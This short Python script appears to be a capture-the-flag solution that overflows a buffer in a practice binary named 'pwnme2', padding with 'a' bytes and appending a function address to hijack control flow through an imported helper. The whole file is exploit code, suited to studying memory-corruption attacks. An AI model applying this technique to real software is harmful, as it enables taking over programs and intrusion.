from templates import buff_overflow, get_func_addr


def main():
    payload = (b"a" * (0x42 + 22)) + get_func_addr("./pwnme2", skip_amt=3)

    buff_overflow(
        payload,
        elf = "./pwnme2",
        interactive = False,
        preserve_payload=True
    )


main()
